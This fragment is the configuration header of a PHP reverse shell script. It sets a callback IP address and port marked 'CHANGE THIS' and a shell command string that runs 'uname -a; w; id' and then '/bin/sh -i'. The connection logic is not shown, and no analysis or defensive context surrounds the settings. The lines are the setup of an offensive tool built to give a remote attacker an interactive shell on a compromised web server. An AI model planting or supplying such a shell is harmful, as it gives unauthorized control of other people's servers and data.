set_time_limit(0);
$VERSION = "1.0";
$ip = '192.168.1.18';  // CHANGE THIS
$port = 8788;  // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;